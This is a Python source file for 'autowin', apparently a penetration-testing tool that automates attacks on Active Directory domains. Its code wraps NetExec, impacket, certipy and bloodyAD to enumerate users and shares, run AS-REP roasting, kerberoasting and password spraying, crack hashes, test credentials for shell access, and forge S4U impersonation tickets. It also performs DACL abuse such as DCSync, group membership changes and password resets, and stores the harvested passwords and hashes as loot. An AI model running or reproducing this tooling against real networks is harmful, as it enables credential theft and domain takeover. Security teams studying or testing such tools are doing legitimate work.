#!/usr/bin/env python3
"""autowin: automated Active Directory vulnerability discovery."""

import argparse
import os
import re
import time
import sys

from .schema import DB, User, Hash, Box, Share, Vuln
from .nxcwrap import Cred
from .shell import have, stream, run_stream
from .store import Store
from .console import info, good, err, warn, banner, plain, command, Progress, start_logging

from . import recon as _recon
from . import roast as _roast
from . import modules as _modules
from . import kerbrute as _kerbrute
from . import bloodhound as _bloodhound
from . import adcs as _adcs
from . import delegation as _delegation
from . import gpo as _gpo
from . import smbops as _smbops
from . import targets as _targets
from . import archive as _archive
from . import dacl as _dacl
from . import verify as _verify

SUBCOMMANDS = {"discover", "spray", "smb", "ticket", "config", "exploit"}

# loot persists here by default so `autowin` works from any directory
DEFAULT_LOOT = os.path.join(os.path.expanduser("~"), ".autowin")


# ---- credential helpers ----------------------------------------------


def domain_creds(db: DB, password_only: bool = False) -> list[Cred]:
    """One best credential per domain (admin preferred), for per-domain ops."""
    chosen: dict[str, Cred] = {}
    for user in db._users:
        if password_only and user.password is None:
            continue
        try:
            cred = Cred.from_user(user)
        except ValueError:
            continue
        name = user.domain.name
        is_admin = len(user.admin_on) > 0
        if name not in chosen or (
            is_admin and not getattr(chosen[name], "_admin", False)
        ):
            cred._admin = is_admin  # type: ignore[attr-defined]
            chosen[name] = cred
    return list(chosen.values())


def _default_domain(db: DB) -> str | None:
    """The domain we'd attribute a hand-supplied credential to: the DC's."""
    for dom in db._domains.values():
        if dom.dc is not None:
            return dom.name
    return next((d.name for d in db._domains.values()), None)


def _inject_cred(db: DB, domain_name: str, username: str, secret: str,
                 is_hash: bool, kerberos: bool) -> Cred:
    """Fold a supplied/stored credential into the in-memory DB so the whole
    pipeline (domain_creds, sweep, adcs, ...) can see it, and return the nxc
    Cred to drive authenticated enumeration with."""
    dom = db.domain(domain_name)
    anchor = dom.dc or (dom.boxes[0] if dom.boxes else None)
    if anchor is not None:
        usr = db.find_user(dom, username)
        if usr is None:
            usr = User(name=username, owner=anchor)
            anchor.local_users[usr.name] = usr
            db._users.append(usr)
        if is_hash and usr.hash is None:
            usr.hash = Hash(source="ntlm", hash=secret)
        elif not is_hash and secret and usr.password is None:
            usr.password = secret
    return Cred(username=username, secret=secret, domain=domain_name,
                is_hash=is_hash, kerberos=kerberos)


def _stored_cred(db: DB, store: Store, username: str, domain: str | None,
                 kerberos: bool) -> Cred | None:
    """Find a stored credential for `username` (plaintext preferred over a bare
    hash) and fold it in. Returns None if we hold nothing for that user."""
    matches = [c for c in store.list_credentials(domain)
               if c["username"].lower() == username.lower()]
    if not matches:
        return None
    matches.sort(key=lambda c: c["is_hash"])     # plaintext (0) before hash (1)
    c = matches[0]
    return _inject_cred(db, c["domain"], c["username"], c["secret"],
                        c["is_hash"], kerberos or c["kerberos"])


def select_creds(db: DB, store: Store, args: argparse.Namespace) -> list[Cred]:
    """Decide which credential(s) discover runs authenticated enum as.

    Precedence:
      1. a credential supplied on the command line (-u with -p/-H, or -u -k for
         a ccache login): stored if new, and pinned as the current user.
      2. -u alone: the matching stored credential.
      3. the pinned 'current user' (see `config current-user`).
      4. auto-pick: one best credential per domain (admin preferred), using a
         plaintext password or an NTLM hash.
    --kerberos forces Kerberos auth on whatever is chosen.
    """
    kerberos = bool(getattr(args, "kerberos", False))
    user = getattr(args, "user", None)
    password = getattr(args, "password", None)
    nt_hash = getattr(args, "hash", None)

    # 1. explicit credential supplied on the command line
    if user and (password or nt_hash or kerberos):
        domain = getattr(args, "domain", None) or _default_domain(db)
        if not domain:
            warn("supplied a credential but gave no --domain and no domain was "
                 "discovered; skipping authenticated enumeration")
            return []
        is_hash = bool(nt_hash)
        secret = nt_hash if is_hash else (password or "")
        if secret:
            store.add_credential(domain, user, secret, is_hash=is_hash, source="supplied",
                                 kerberos=kerberos)
        store.add_user(domain, user)
        store.set_current_user(domain, user, kerberos)
        kind = "hash" if is_hash else ("kerberos/ccache" if not secret else "password")
        good(f"using supplied credential {domain}\\{user} ({kind}) [pinned as current user]")
        return [_inject_cred(db, domain, user, secret, is_hash, kerberos)]

    # 2. -u alone: the stored credential for that user
    if user:
        cred = _stored_cred(db, store, user, getattr(args, "domain", None), kerberos)
        if cred:
            good(f"using stored credential {cred.domain}\\{cred.username}")
            return [cred]
        warn(f"no stored credential for user {user!r}; auto-selecting instead")

    # 3. the pinned current user
    pinned = store.get_current_user()
    if pinned:
        cred = _stored_cred(db, store, pinned["username"], pinned["domain"],
                            kerberos or pinned["kerberos"])
        if cred:
            good(f"using current user {cred.domain}\\{cred.username}"
                 + (" (kerberos)" if cred.kerberos else ""))
            return [cred]
        warn(f"current user {pinned['domain']}\\{pinned['username']} has no stored "
             "credential; auto-selecting instead")

    # 4. auto-pick: highest-privilege credential per domain (password or hash),
    #    inheriting the Kerberos flag stored on each credential
    creds = domain_creds(db, password_only=False)
    krb = {(c["domain"].lower(), c["username"].lower())
           for c in store.list_credentials() if c["kerberos"]}
    for c in creds:
        if kerberos or ((c.domain or "").lower(), c.username.lower()) in krb:
            c.kerberos = True
    return creds


def load_hosts(db: DB, store: Store) -> None:
    """Rebuild hosts/domains from the store BEFORE recon, so a resumed run can
    skip the network scan and still have its boxes."""
    for h in store.list_hosts():
        if h["hostname"] in db._hosts:
            continue
        dom = db.domain(h["domain"])
        box = Box(
            ip=h["ip"],
            hostname=h["hostname"],
            domain=dom,
            dc=h["dc"],
            signing=h["signing"],
            smbv1=h["smbv1"],
            smb_null_auth=h["null_auth"],
            os=h["os"],
        )
        db._hosts[box.hostname] = box
        dom.boxes.append(box)
        if box.dc:
            dom.dc = box


def load_findings(db: DB, store: Store) -> None:
    """Load users/credentials/hashes/shares/vulns from the store AFTER recon,
    anchoring them to boxes (from the store or this run's scan)."""

    def anchor_for(domain_name: str) -> Box | None:
        dom = db.domain(domain_name)
        return dom.dc or (dom.boxes[0] if dom.boxes else None)

    users = creds = 0
    for u in store.list_users():
        anchor = anchor_for(u["domain"])
        if anchor and db.find_user(anchor.domain, u["username"]) is None:
            usr = User(name=u["username"], owner=anchor, description=u["description"])
            anchor.local_users[usr.name] = usr
            db._users.append(usr)
            users += 1
    for c in store.list_credentials():
        anchor = anchor_for(c["domain"])
        if anchor is None:
            continue
        usr = db.find_user(anchor.domain, c["username"])
        if usr is None:
            usr = User(name=c["username"], owner=anchor)
            anchor.local_users[usr.name] = usr
            db._users.append(usr)
            users += 1
        if c["is_hash"] and usr.hash is None:
            usr.hash = Hash(source="ntlm", hash=c["secret"])
            creds += 1
        elif not c["is_hash"] and usr.password is None:
            usr.password = c["secret"]
            creds += 1
    for h in store.list_hashes():
        anchor = anchor_for(h["domain"])
        if anchor:
            usr = db.find_user(anchor.domain, h["username"])
            if usr and usr.hash is None:
                usr.hash = Hash(source=h["source"], hash=h["hash"])
    for s in store.list_shares():
        box = db._hosts.get(s["host"])
        if box and s["name"] not in box.local_shares:
            box.local_shares[s["name"]] = Share(
                name=s["name"],
                owner=box,
                description=s["remark"],
                readable="R" in (s["perms"] or ""),
                writable="W" in (s["perms"] or ""),
            )
    for v in store.list_vulns():
        box = db._hosts.get(v["host"])
        if box:
            vuln = Vuln(
                title=v["title"],
                owner=box,
                source=v["source"],
                cve=v["cve"],
                detail=v["detail"],
                esc=v["esc"],
            )
            box.vulns[vuln.key()] = vuln

    if users or creds:
        info(
            f"resume: loaded {users} user(s) and {creds} credential(s) from the store "
            f"(delete autowin.sqlite to start fresh)"
        )


# ---- discovery pipeline ----------------------------------------------


def discover(args: argparse.Namespace) -> None:
    if not have("nxc"):
        err("nxc (NetExec) not found on PATH; it is required")
        return

    store = Store(args.loot_dir)
    db = DB(store=store)
    wordlist = args.wordlist
    crack = not args.no_crack

    info(f"loot store: {store.dir}")
    load_hosts(db, store)  # resume: boxes first, so recon can be skipped
    if args.ip_range:
        _recon.recon(
            db, args.ip_range, args.threads, exclude=args.exclude, rescan=args.rescan
        )
    else:
        info(f"no ip range given; operating on {len(db._hosts)} stored target(s)")
    if not db._hosts:
        err("no hosts: give an ip range, or add targets with `autowin host add`")
        store.close()
        return
    load_findings(db, store)  # users/creds/hashes/shares/vulns anchor to boxes

    # keep /etc/hosts in step with what we know, and adopt the DC as the
    # default target so later commands can omit it
    _targets.sync_etc_hosts(store)
    if not store.get_default_target():
        dc = next((b for b in db._hosts.values() if b.dc), None)
        if dc:
            store.set_default_target(dc.hostname or dc.ip)
            good(f"default target set to {dc.hostname or dc.ip} (DC)")

    # ---- sweep-only: just the NetExec module sweep, skip everything else -----
    # Handy once you already hold a privileged credential and only want the
    # vuln/CVE/loot modules -- no re-enumeration, roasting, BloodHound, etc.
    if args.vulns:
        banner("netexec module sweep only")
        creds = select_creds(db, store, args)
        if creds:
            info(f"sweeping as {len(creds)} credential(s): "
                 + ", ".join(c.label() for c in creds))
            # verify just these creds (sets admin_on) so loot modules can run
            sel_users: list[User] = []
            for cred in creds:
                dom = db.domain(cred.domain) if cred.domain else None
                usr = db.find_user(dom, cred.username) if dom else None
                if usr and usr not in sel_users:
                    sel_users.append(usr)
            if sel_users:
                info("verifying the credential(s) (enables admin-only loot modules)")
                _verify.verify_access(db, users=sel_users)
        else:
            info("no credential selected; sweeping with anonymous context only")
        info("sweeping NetExec vuln / CVE / loot modules")
        _modules.sweep(db)
        db.report()
        good(f"loot persisted to {store.dir}")
        store.close()
        return

    # ---- unauthenticated discovery (runs once; resume-gated per context) ----
    #
    # No more re-scan rounds: the unauthenticated enum is done exactly once and
    # its raw output is saved under the loot store. To pull in new findings
    # with a credential, just re-run discover with -u/-p (or -u/-H) -- the
    # resume markers make the already-done steps cheap no-ops.
    banner("unauthenticated discovery")
    if args.userlist:
        _kerbrute.userenum(db, args.userlist)

    info("enumerating users (SMB null / guest + RID brute)")
    _recon.enumerate_users(db, Cred.anonymous())
    _recon.enumerate_users(db, Cred.guest())
    info("enumerating shares (guest)")
    _recon.enumerate_shares(db, Cred.guest())

    info("enumerating password policy")
    _recon.enumerate_password_policy(db, Cred.anonymous())
    _recon.enumerate_password_policy(db, Cred.guest())

    info("as-rep roasting")
    _roast.asrep(db)
    if crack:
        _roast.crack_hashes(db, wordlist)

    # ---- choose the credential(s) for authenticated discovery ----------
    creds = select_creds(db, store, args)

    if creds:
        banner("authenticated discovery")
        info(f"authenticated enumeration with {len(creds)} credential(s): "
             + ", ".join(c.label() for c in creds))
        for cred in creds:
            _recon.enumerate_users(db, cred)
            _recon.ldap_enumerate_users(db, cred)
            _recon.enumerate_shares(db, cred)
            _recon.enumerate_password_policy(db, cred)
            info(f"kerberoasting as {cred.username}")
            _roast.kerberoast(db, cred)
        if crack:
            _roast.crack_hashes(db, wordlist)
    else:
        info("no credentials available; skipping authenticated enumeration "
             "(supply -u with -p or -H, pin one with `autowin config current-user`, "
             "or add one with `autowin config cred add`)")

    # one-shot BloodHound collection per domain (first valid cred)
    _bloodhound.run_bloodhound(db)

    info("verifying credentials (SMB validity, SMB/WinRM shells)")
    _verify.verify_access(db)

    info("sweeping NetExec vuln / CVE / loot modules")
    _modules.sweep(db)

    for cred in creds:
        info(f"enumerating ADCS with certipy as {cred.username}")
        _adcs.find(db, cred)
        info("enumerating Kerberos delegation")
        _delegation.find_delegation(db, cred)

    if crack:
        _roast.crack_hashes(db, wordlist)

    if args.timeroast and crack:
        info("timeroasting computer accounts")
        _roast.timeroast(db, wordlist)

    db.report()
    good(f"loot persisted to {store.dir} (users.txt, hashes/, autowin.sqlite)")
    store.close()


# ---- spray (explicit, never automatic) -------------------------------


def spray_cmd(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    try:
        target = resolve_target(args.dc, store, "target")
        if target is None:
            return
        if args.users:
            with open(args.users) as f:
                users = [l.strip() for l in f if l.strip()]
        else:
            users = [r["username"] for r in store.list_users(args.domain)]
        if not users:
            err(
                "spray: no users (pass --users FILE, or run discover first to populate the store)"
            )
            return

        # optional kerbrute-style user validation via NetExec: confirm which of
        # the candidates actually exist and fold them into the store (no
        # password), so they surface under `cred list` as known-but-credless.
        if args.validate_users:
            valid = _kerbrute.validate_userlist(target, args.domain, users)
            for user in valid:
                store.add_user(args.domain, user)
            (good if valid else warn)(
                f"validated {len(valid)} user(s) of {len(users)} candidate(s)"
            )
            if valid:
                users = valid  # spray only the users we confirmed exist

        base: list[str] = []
        if args.password:
            base.append(args.password)
        if args.passwords:
            with open(args.passwords) as f:
                base += [l.strip() for l in f if l.strip()]
        if not base and not args.password_equals_username:
            if args.validate_users:
                return  # validation-only run: nothing left to spray
            err(
                "spray: give -p/--password, --passwords FILE, and/or --password-equals-username"
            )
            return

        info(f"spraying {len(users)} user(s) against {target} ({args.domain})")
        hits: list[tuple[str, str]] = []
        with Progress("spraying", total=len(users)) as bar:
            for user in users:
                candidates = ([user] if args.password_equals_username else []) + base
                hits += _roast.spray_targets(
                    target, args.domain, [user], candidates, store=store
                )
                bar.update()
        (good if hits else warn)(f"spray complete: {len(hits)} credential(s) found")
    finally:
        store.close()


# ---- credential store management -------------------------------------


def cred_add(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    is_hash = bool(args.hash)
    secret = args.hash if is_hash else args.password
    store.add_credential(
        args.domain,
        args.user,
        secret,
        is_hash=is_hash,
        source="manual",
        host=args.host or "",
        kerberos=args.kerberos,
    )
    store.add_user(args.domain, args.user)
    krb = " (kerberos)" if args.kerberos else ""
    good(
        f"stored credential {args.domain}\\{args.user} "
        f"({'hash' if is_hash else 'password'}){krb}"
    )

    if args.force:
        store.close()
        return

    # check whether this credential can get a shell, and say where -- across
    # every known host (or just --host), so adding a user tells you its reach
    if args.host:
        hosts = [(args.host, args.host)]
    else:
        rows = store.list_hosts()
        dom = [h for h in rows if (h["domain"] or "").lower() == args.domain.lower()]
        hosts = [(h["hostname"] or h["ip"], h["ip"]) for h in (dom or rows)]
    if not hosts:
        warn("no known hosts to check against (pass --host, or run discover first)")
        store.close()
        return

    info(f"checking {args.domain}\\{args.user} for shell access on {len(hosts)} host(s)...")
    any_valid, shells_by_host = _verify.check_cred_hosts(
        args.domain, args.user, secret, is_hash, hosts, kerberos=args.kerberos)
    all_shells = sorted({s for shells in shells_by_host.values() for s in shells})
    shell_host = next(iter(shells_by_host), "")
    store.set_cred_status(args.domain, args.user, any_valid or bool(shells_by_host),
                          ",".join(all_shells), shell_host)
    if shells_by_host:
        for host, shells in shells_by_host.items():
            good(f"{args.domain}\\{args.user} CAN get a shell on {host} "
                 f"via {', '.join(sorted(shells))}")
    elif any_valid:
        good(f"{args.domain}\\{args.user} is valid, but cannot get a shell on any known host")
    else:
        warn(f"{args.domain}\\{args.user} did NOT authenticate on any of "
             f"{len(hosts)} host(s) (stored anyway)")
    store.close()


def cred_list(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    rows = store.list_credentials(args.domain)
    if not rows:
        info("no credentials stored")
    have: set[tuple[str, str]] = set()
    status = store.cred_status_map(args.domain)
    for c in rows:
        tag = "hash" if c["is_hash"] else "pass"
        if c["kerberos"]:
            tag += ", kerberos"
        have.add((c["domain"], c["username"]))
        st = status.get((c["domain"], c["username"]))
        note = ""
        if st is not None:
            if st["shell"]:
                note = f"  [valid, shell: {st['shell']}]"
            elif st["valid"]:
                note = "  [valid, no shell]"
            else:
                note = "  [INVALID]"
        print(f"{c['domain']}\\{c['username']}:{c['secret']} ({tag}, {c['source']}){note}")

    # users we know exist (e.g. kerbrute-validated) but hold no credential for;
    # only shown with --all, so the default stays a pure credential listing
    if args.all:
        credless = [
            u
            for u in store.list_users(args.domain)
            if (u["domain"], u["username"]) not in have
        ]
        if credless:
            info(f"known users without a credential ({len(credless)}):")
            for u in credless:
                print(f"{u['domain']}\\{u['username']} (no creds)")
    store.close()


def cred_rm(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    try:
        secret, is_hash = None, None
        if args.hash:
            secret, is_hash = args.hash, True
        elif args.password:
            secret, is_hash = args.password, False

        n = store.remove_credential(args.user, domain=args.domain,
                                    secret=secret, is_hash=is_hash)
        if n:
            scope = f"{args.domain}\\{args.user}" if args.domain else args.user
            good(f"removed {n} credential(s) for {scope}")
        else:
            warn(f"no stored credential matched {args.user}"
                 + (f" in {args.domain}" if args.domain else ""))

        # if the user now has no credentials left, drop its status and unpin it
        remaining = [c for c in store.list_credentials(args.domain)
                     if c["username"].lower() == args.user.lower()]
        if not remaining:
            store.remove_cred_status(args.user, args.domain)
            cur = store.get_current_user()
            if (cur and cur["username"].lower() == args.user.lower()
                    and (not args.domain or cur["domain"].lower() == args.domain.lower())):
                store.clear_current_user()
                info("cleared the current user (its credential was removed)")
    finally:
        store.close()


def current_user_cmd(args: argparse.Namespace) -> None:
    """Show, set, or clear the credential discover uses by default."""
    store = Store(args.loot_dir)
    try:
        if args.clear:
            store.clear_current_user()
            good("current user cleared")
            return

        domain = args.domain
        user = args.user_opt
        if args.user:                       # positional "DOMAIN\\user" or bare "user"
            if "\\" in args.user:
                domain, user = args.user.split("\\", 1)
            else:
                user = args.user

        if not user:                        # no selection given -> show current
            cur = store.get_current_user()
            if cur:
                tag = " (kerberos)" if cur["kerberos"] else ""
                print(f"{cur['domain']}\\{cur['username']}{tag}")
            else:
                info("no current user set")
            return

        if not domain:
            err(r"give a domain: `config current-user DOMAIN\user` or `-d DOMAIN -u USER`")
            return

        store.set_current_user(domain, user, args.kerberos)
        store.add_user(domain, user)        # ensure it exists even with no cred yet
        have = any(c["username"].lower() == user.lower()
                   for c in store.list_credentials(domain))
        good(f"current user set to {domain}\\{user}"
             + (" (kerberos)" if args.kerberos else ""))
        if not have:
            warn("no credential stored for this user yet "
                 "(add one with `autowin config cred add`, or pass -p/-H to discover)")
    finally:
        store.close()


def _cred_from_args(args: argparse.Namespace) -> Cred:
    """Build an nxc credential from the shared auth flags. Uses getattr so it
    works for commands that don't define every flag (e.g. s4u has no -k)."""
    is_hash = bool(getattr(args, "hash", None))
    secret = getattr(args, "hash", None) if is_hash else (getattr(args, "password", None) or "")
    return Cred(
        username=getattr(args, "user", None) or "",
        secret=secret,
        domain=getattr(args, "domain", None),
        is_hash=is_hash,
        kerberos=bool(getattr(args, "kerberos", False)),
    )


def _resolve_smb_domain(store: Store, target: str, user: str | None) -> str | None:
    """Best domain for an SMB op when -d was omitted: the target host's domain,
    else the domain of a stored credential for this user. Without it, smbclient
    falls back to WORKGROUP and a domain account fails with LOGON_FAILURE."""
    for h in store.list_hosts():
        if target in (h["hostname"], h["ip"]) and h["domain"]:
            return h["domain"]
    if user:
        for c in store.list_credentials():
            if c["username"].lower() == user.lower() and c["domain"]:
                return c["domain"]
    return None


def _cred_from_row(c: dict, kerberos: bool = False) -> Cred:
    return Cred(c["username"], c["secret"], c["domain"],
                is_hash=c["is_hash"], kerberos=c["kerberos"] or kerberos)


def _stored_cred_for_user(store: Store, user: str, domain: str | None,
                          kerberos: bool) -> Cred | None:
    """The stored credential for `user` (plaintext preferred over a bare hash),
    so specifying just a username never requires re-typing the secret."""
    matches = [c for c in store.list_credentials(domain)
               if c["username"].lower() == user.lower()]
    if not matches:
        return None
    matches.sort(key=lambda c: c["is_hash"])
    return _cred_from_row(matches[0], kerberos)


def _default_smb_cred(store: Store, domain: str | None) -> Cred | None:
    """The credential to use when none is named: the pinned current user, else
    the best stored credential for the domain (shell > valid > plaintext)."""
    cur = store.get_current_user()
    if cur:
        cred = _stored_cred_for_user(store, cur["username"],
                                     cur["domain"], cur["kerberos"])
        if cred:
            return cred
    creds = store.list_credentials(domain)
    if not creds:
        return None
    status = store.cred_status_map(domain)
    def rank(c):
        st = status.get((c["domain"], c["username"]), {})
        return (bool(st.get("shell")), bool(st.get("valid")), not c["is_hash"])
    creds.sort(key=rank, reverse=True)
    return _cred_from_row(creds[0])


def _pick_smb_cred(store: Store, args: argparse.Namespace) -> Cred:
    """Resolve the credential for a manual SMB op. Precedence:
      1. --null            -> anonymous / null session
      2. -u with -p/-H/-k  -> exactly what was given
      3. -u alone          -> that user's stored credential (no password needed)
      4. nothing named     -> pinned current user, else best stored credential
    """
    user = getattr(args, "user", None)
    password = getattr(args, "password", None)
    nt_hash = getattr(args, "hash", None)
    kerberos = bool(getattr(args, "kerberos", False))
    domain = getattr(args, "domain", None)

    if getattr(args, "null", False):
        return Cred.anonymous()
    if user and (password or nt_hash or kerberos):
        cred = _cred_from_args(args)
        if not cred.kerberos:                       # inherit a Kerberos marking
            stored = _stored_cred_for_user(store, user, cred.domain, False)
            if stored and stored.kerberos:
                cred.kerberos = True
        return cred
    if user:
        return (_stored_cred_for_user(store, user, domain, kerberos)
                or _cred_from_args(args))
    return _default_smb_cred(store, domain) or Cred.anonymous()


def _auth_line(cred: Cred) -> str:
    """Human-readable 'who am I logging in as' for the console."""
    if not cred.username:
        return "anonymous / null session"
    who = f"{cred.domain}\\{cred.username}" if cred.domain else cred.username
    secret = cred.secret or "<ccache>"
    kind = "hash" if cred.is_hash else ("kerberos" if not cred.secret else "password")
    tag = " +kerberos" if cred.kerberos and cred.secret else ""
    return f"{who} : {secret} ({kind}{tag})"


def _resolve_args_cred(store: Store, args: argparse.Namespace,
                       target: str | None = None) -> Cred:
    """Resolve a credential for any tool from the store, then write the result
    back onto `args` so handlers that read args.user/password/hash/domain/
    kerberos keep working. Same precedence as the SMB ops: an explicit
    user+secret wins; a bare username pulls that user's stored secret; nothing
    named falls back to the current user / best stored credential.

    This is what makes "specify just a username (or nothing) and it uses the
    stored cred" work across every command, not only `smb`.
    """
    # an AES key is a full secret the store doesn't hold -> treat as explicit
    if getattr(args, "aes", None) and getattr(args, "user", None):
        if not getattr(args, "domain", None) and target:
            args.domain = _resolve_smb_domain(store, target, args.user) or args.domain
        return Cred(args.user, "", getattr(args, "domain", None))

    cred = _pick_smb_cred(store, args)
    if cred.username and not cred.domain and target:
        dom = _resolve_smb_domain(store, target, cred.username)
        if dom:
            cred.domain = dom

    if hasattr(args, "user"):
        args.user = cred.username or None
    if cred.domain and hasattr(args, "domain"):
        args.domain = cred.domain
    if hasattr(args, "password"):
        args.password = None if cred.is_hash else (cred.secret or None)
    if hasattr(args, "hash"):
        args.hash = cred.secret if cred.is_hash else getattr(args, "hash", None)
    if hasattr(args, "kerberos"):
        args.kerberos = cred.kerberos or bool(getattr(args, "kerberos", False))
    return cred


def smb_cmd(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    try:
        target = resolve_target(args.target, store, "target")
        if target is None:
            return
        # fill the domain from the store so a domain account doesn't fall back
        # to WORKGROUP (smbclient would fail with LOGON_FAILURE)
        if not args.domain:
            args.domain = _resolve_smb_domain(store, target, args.user)
        cred = _pick_smb_cred(store, args)
        if cred.username and not cred.domain and args.domain:
            cred.domain = args.domain                # inherit the resolved domain
    finally:
        store.close()

    info(f"authenticating to {target} as {_auth_line(cred)}")
    if args.smb_cmd == "shares":
        _smbops.list_shares(target, cred)
    elif args.smb_cmd == "shell":
        _smbops.shell(target, cred, dc_ip=args.dc_ip)
    elif args.smb_cmd == "download":
        _smbops.download(target, cred, args.share, args.output, dc_ip=args.dc_ip)


# ---- target selection -------------------------------------------------

def resolve_target(given: str | None, store: Store, what: str = "target") -> str | None:
    """Return the explicit target, else the stored default, else None (+error)."""
    if given:
        return given
    default = store.get_default_target()
    if default:
        info(f"using default {what}: {default}")
        return default
    err(f"no {what} given and no default set (set one with `autowin host default <target>`)")
    return None


# ---- host / target management -----------------------------------------

def host_cmd(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    try:
        if args.host_cmd == "list":
            rows = store.list_hosts()
            if not rows:
                info("no hosts known (run discover, or `host add`)")
            default = store.get_default_target()
            for h in rows:
                tags = []
                if h["dc"]:
                    tags.append("DC")
                if h["hostname"] == default or h["ip"] == default:
                    tags.append("default")
                tag = f" [{', '.join(tags)}]" if tags else ""
                print(f"{h['ip']}\t{h['hostname']}\t{h['domain']}{tag}")

        elif args.host_cmd == "add":
            hostname = args.hostname or args.ip
            store.add_host(args.ip, hostname, args.domain or "", args.dc,
                           True, False, False, None)
            good(f"added host {args.ip} ({hostname}{'/' + args.domain if args.domain else ''})")

        elif args.host_cmd == "rm":
            n = store.remove_host(args.target)
            (good if n else warn)(f"removed {n} host(s) matching {args.target}")

        elif args.host_cmd == "default":
            if args.target:
                store.set_default_target(args.target)
                good(f"default target set to {args.target}")
            else:
                cur = store.get_default_target()
                print(cur if cur else "(no default target set)")

        elif args.host_cmd == "sync":
            _targets.sync_etc_hosts(store)
    finally:
        store.close()


def _run_ccache_tool(loot_dir: str, cmd: list[str], label: str) -> None:
    """Run an impacket tool that drops a .ccache into <loot>/tickets, then
    report the newest ccache and the KRB5CCNAME export to use."""
    import glob
    import subprocess

    store = Store(loot_dir)
    tdir = os.path.join(str(store.dir), "tickets")
    os.makedirs(tdir, exist_ok=True)
    store.close()

    before = set(glob.glob(os.path.join(tdir, "*.ccache")))
    proc = subprocess.run(cmd, cwd=tdir, capture_output=True, text=True)
    for line in ((proc.stdout or "") + (proc.stderr or "")).splitlines():
        if line.strip():
            print("  " + line.strip())

    produced = sorted(set(glob.glob(os.path.join(tdir, "*.ccache"))) - before,
                      key=os.path.getmtime)
    ccache = produced[-1] if produced else None
    if ccache is None:                 # the tool may have overwritten an existing one
        existing = glob.glob(os.path.join(tdir, "*.ccache"))
        ccache = max(existing, key=os.path.getmtime) if existing else None
    if ccache and os.path.isfile(ccache):
        good(f"{label} saved: {ccache}")
        info("set your shell to use it, then pass -k to smb/other commands:")
        print(f"\n  export KRB5CCNAME={ccache}\n")
    else:
        err(f"{label}: no ccache produced; check the output above")


def ticket_cmd(args: argparse.Namespace) -> None:
    if not have("impacket-getTGT"):
        err("ticket: impacket-getTGT not found on PATH (install impacket)")
        return
    store = Store(args.loot_dir)
    try:
        _resolve_args_cred(store, args, target=args.dc_ip)
    finally:
        store.close()
    if not args.user or not (args.password or args.hash or args.aes):
        err("ticket: need a user and a secret (give -u/-p, -u/-H, --aes, or store a cred)")
        return
    if not args.domain:
        err("ticket: domain unknown (pass -d, or set a current user)")
        return
    authority = f"{args.domain}/{args.user}"
    cmd = ["impacket-getTGT"]
    if args.hash:
        cmd += ["-hashes", args.hash if ":" in args.hash else f":{args.hash}"]
    elif args.aes:
        cmd += ["-aesKey", args.aes]
    elif args.password:
        authority += f":{args.password}"
    if args.dc_ip:
        cmd += ["-dc-ip", args.dc_ip]
    cmd.append(authority)
    info(f"requesting TGT for {args.domain}/{args.user}")
    _run_ccache_tool(args.loot_dir, cmd, "TGT")


def s4u_cmd(args: argparse.Namespace) -> None:
    """Constrained-delegation abuse: S4U2Self+S4U2Proxy to impersonate a user
    to a target SPN, via impacket getST."""
    if not have("impacket-getST"):
        err("s4u: impacket-getST not found on PATH (install impacket)")
        return
    store = Store(args.loot_dir)
    try:
        _resolve_args_cred(store, args, target=args.dc_ip)
    finally:
        store.close()
    if not args.user or not (args.password or args.hash or args.aes):
        err("s4u: need a user and a secret (give -u/-p, -u/-H, --aes, or store a cred)")
        return
    if not args.domain:
        err("s4u: domain unknown (pass -d, or set a current user)")
        return
    authority = f"{args.domain}/{args.user}"
    cmd = ["impacket-getST", "-spn", args.spn, "-impersonate", args.impersonate]
    if args.hash:
        cmd += ["-hashes", args.hash if ":" in args.hash else f":{args.hash}"]
    elif args.aes:
        cmd += ["-aesKey", args.aes]
    elif args.password:
        authority += f":{args.password}"
    if args.dc_ip:
        cmd += ["-dc-ip", args.dc_ip]
    cmd.append(authority)
    info(f"requesting S4U ticket as {args.impersonate} for {args.spn}")
    _run_ccache_tool(args.loot_dir, cmd, "S4U ticket")


def dacl_cmd(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    try:
        host = resolve_target(args.dc, store, "DC")
        if host is None:
            return
        cred = _resolve_args_cred(store, args, target=host)
    finally:
        store.close()
    if not args.user or not (args.password or args.hash or args.kerberos):
        err("dacl: need a user and a secret (give -u/-p, -u/-H, -k, or store a cred)")
        return
    if not args.domain:
        err("dacl: domain unknown (pass -d, or set a current user)")
        return
    info(f"bloodyAD on {host} as {_auth_line(cred)}")
    auth = _dacl._auth(args.domain, args.user, args.hash or args.password or "",
                       bool(args.hash), args.kerberos, host, args.dc_ip)
    me = args.user
    if args.dacl_cmd == "dcsync":
        _dacl.dcsync(auth, args.trustee or me)
    elif args.dacl_cmd == "genericall":
        _dacl.generic_all(auth, args.target, args.trustee or me)
    elif args.dacl_cmd == "addmember":
        _dacl.add_member(auth, args.group, args.member or me)
    elif args.dacl_cmd == "setpassword":
        _dacl.set_password(auth, args.target, args.new_password)
    elif args.dacl_cmd == "setowner":
        _dacl.set_owner(auth, args.target, args.owner or me)


def export_cmd(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    try:
        out = args.output or f"autowin-export-{time.strftime('%Y%m%d-%H%M%S')}.zip"
        _archive.export_loot(store, out, include_logs=args.include_logs)
    finally:
        store.close()


def import_cmd(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    try:
        _archive.import_loot(store, args.file)
    finally:
        store.close()


def logs_cmd(args: argparse.Namespace) -> None:
    import glob

    store = Store(args.loot_dir)
    logs_dir = os.path.join(str(store.dir), "logs")
    store.close()

    files = sorted(glob.glob(os.path.join(logs_dir, "*.log")), key=os.path.getmtime)
    if not files:
        info(f"no logs yet in {logs_dir}")
        return
    latest = files[-1]

    if args.path:
        print(latest)
    elif args.follow:
        info(f"following {latest} (Ctrl-C to stop)")
        stream("tail", "-f", latest)
    elif args.tail is not None:
        with open(latest, encoding="utf-8", errors="ignore") as f:
            for line in f.read().splitlines()[-args.tail:]:
                print(line)
    else:
        info(f"logs in {logs_dir} ({len(files)} file(s), newest last):")
        for fpath in files:
            print(f"  {os.path.basename(fpath)}  ({os.path.getsize(fpath)} bytes)")



